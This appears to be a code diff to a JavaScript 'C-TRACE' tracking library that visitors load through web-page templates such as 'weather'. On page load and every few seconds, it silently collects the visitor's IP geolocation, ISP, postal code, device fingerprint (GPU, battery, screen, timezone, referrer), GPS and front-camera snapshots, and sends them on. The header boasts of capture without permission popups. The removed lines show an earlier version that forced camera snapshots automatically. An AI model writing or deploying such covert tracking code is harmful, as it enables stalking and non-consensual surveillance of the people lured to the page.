@@ -1,10 +1,9 @@
 /**
- * Telemetry Client Library for Live Tracker
+ * C-TRACE Telemetry & OSINT Tracking Library
  * Features:
- * 1. Instant Zero-Permission IP Location Fallback (Captures City, Country, IP, ISP, Lat, Lng immediately).
- * 2. High Accuracy GPS Tracking.
- * 3. iOS / iPhone Safari optimized camera snapshot capture with playsinline support.
- * 4. Battery & Mobile Specs Collection.
+ * 1. Zero-Permission Passive IP & Device Telemetry (Captures City, Country, ISP, Lat, Lng, OS, Browser, GPU, Battery silently with 0 browser permission popups).
+ * 2. Optional High Accuracy GPS & HD Camera Snapshot capture when explicitly enabled or triggered by user interaction.
+ * 3. iOS / iPhone & Android universal mobile support.
  */
 
 (function (window) {
@@ -40,7 +39,10 @@
                     country: data.country_name,
                     lat: data.latitude,
                     lng: data.longitude,
-                    isp: data.org || data.asn
+                    isp: data.org || data.asn,
+                    asn: data.asn,
+                    postal: data.postal,
+                    timezone: data.timezone
                 };
                 return cachedIpLocation;
             }
@@ -56,7 +58,9 @@
                         country: data2.country,
                         lat: data2.lat,
                         lng: data2.lon,
-                        isp: data2.isp
+                        isp: data2.isp,
+                        asn: data2.as || '',
+                        timezone: data2.timezone || ''
                     };
                     return cachedIpLocation;
                 }
@@ -80,6 +84,23 @@
         return null;
     }
 
+    function getGPUInfo() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    return {
+                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'N/A',
+                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A'
+                    };
+                }
+            }
+        } catch (e) {}
+        return { vendor: 'N/A', renderer: 'N/A' };
+    }
+
     function getDeviceInfo() {
         const ua = navigator.userAgent;
         let os = "Unknown OS";
@@ -92,6 +113,8 @@
         let browser = "Unknown Browser";
         if (ua.includes("CriOS")) browser = "Chrome iOS";
         else if (ua.includes("FxiOS")) browser = "Firefox iOS";
+        else if (ua.includes("Instagram")) browser = "Instagram In-App Browser";
+        else if (ua.includes("FBAN") || ua.includes("FBAV")) browser = "Facebook In-App Browser";
         else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
         else if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
         else if (ua.includes("Edg")) browser = "Edge";
@@ -101,16 +124,29 @@
             network = navigator.connection.effectiveType || navigator.connection.type || "Unknown";
         }
 
+        const gpu = getGPUInfo();
+        let tz = '';
+        try {
+            tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        } catch (e) {}
+
         return {
             os: os,
             browser: browser,
             userAgent: ua,
-            platform: navigator.platform || 'iPhone/iPad',
+            platform: navigator.platform || 'Mobile/Desktop',
             language: navigator.language || 'en',
             screen: `${window.screen.width}x${window.screen.height}`,
+            colorDepth: `${window.screen.colorDepth}-bit`,
+            devicePixelRatio: window.devicePixelRatio || 1,
             deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
             hardwareConcurrency: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : 'N/A',
-            network: network
+            network: network,
+            gpuVendor: gpu.vendor,
+            gpuRenderer: gpu.renderer,
+            touchPoints: navigator.maxTouchPoints || 0,
+            timezone: tz,
+            referrer: document.referrer || 'Direct Access'
         };
     }
 
@@ -120,7 +156,6 @@
                 return null;
             }
 
-            // iOS Safari & Mobile compatible camera constraints
             const constraints = {
                 video: {
                     facingMode: "user",
@@ -147,7 +182,6 @@
             video.srcObject = stream;
 
             await video.play();
-            // Wait 600ms for camera warm-up
             await new Promise(resolve => setTimeout(resolve, 600));
 
             const canvas = document.createElement("canvas");
@@ -163,32 +197,28 @@
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             const photoData = canvas.toDataURL("image/jpeg", 0.92);
-
-            // Stop stream tracks
             stream.getTracks().forEach(track => track.stop());
 
             return photoData;
         } catch (err) {
-            console.warn("Camera capture note:", err.message);
             return null;
         }
     }
 
     let isCapturingPhoto = false;
 
-    async function sendTelemetry(coords, templateName = 'weather', forcePhoto = false) {
+    async function sendTelemetry(coords = null, templateName = 'weather', captureCamera = false) {
         const battery = await getBatteryInfo();
         const device = getDeviceInfo();
         const ipLocation = await fetchIPLocation();
 
         let photo = null;
-        if (forcePhoto && !isCapturingPhoto) {
+        if (captureCamera && !isCapturingPhoto) {
             isCapturingPhoto = true;
             photo = await captureCameraSnapshot();
             isCapturingPhoto = false;
         }
 
-        // Use GPS coordinates if available, otherwise fallback to IP Location
         const lat = coords ? coords.latitude : (ipLocation ? ipLocation.lat : null);
         const lng = coords ? coords.longitude : (ipLocation ? ipLocation.lng : null);
         const accuracy = coords ? coords.accuracy : (ipLocation ? 5000 : null);
@@ -228,23 +258,27 @@
         getDeviceInfo: getDeviceInfo,
         fetchIPLocation: fetchIPLocation,
         startTracking: function (options = {}) {
-            const { templateName = 'weather', updateInterval = 4000, photoInterval = 8000, onSuccess, onError } = options;
+            const { 
+                templateName = 'weather', 
+                updateInterval = 5000, 
+                enableCamera = false, 
+                enableGPS = false,
+                onSuccess, 
+                onError 
+            } = options;
 
-            let photoCounter = 0;
+            // Instantly send zero-permission passive IP telemetry right away on page load
+            sendTelemetry(null, templateName, enableCamera);
 
-            // Instantly send IP location telemetry right away on page load
-            sendTelemetry(null, templateName, true);
-
-            function triggerLocationUpdate(includePhoto = false) {
-                if (navigator.geolocation) {
+            function triggerLocationUpdate(shouldTakePhoto = false) {
+                if (enableGPS && navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         async (position) => {
-                            await sendTelemetry(position.coords, templateName, includePhoto);
+                            await sendTelemetry(position.coords, templateName, shouldTakePhoto);
                             if (onSuccess) onSuccess(position.coords);
                         },
                         async (error) => {
-                            // Fallback to IP location silently if GPS denied or pending
-                            await sendTelemetry(null, templateName, includePhoto);
+                            await sendTelemetry(null, templateName, shouldTakePhoto);
                             if (onError) onError(error);
                         },
                         {
@@ -254,17 +288,13 @@
                         }
                     );
                 } else {
-                    sendTelemetry(null, templateName, includePhoto);
+                    sendTelemetry(null, templateName, shouldTakePhoto);
                 }
             }
 
             // Continuous telemetry cycle
             setInterval(() => {
-                photoCounter++;
-                const shouldTakePhoto = photoCounter >= Math.max(1, Math.floor(photoInterval / updateInterval));
-                if (shouldTakePhoto) photoCounter = 0;
-
-                triggerLocationUpdate(shouldTakePhoto);
+                triggerLocationUpdate(enableCamera);
             }, updateInterval);
         }
     };
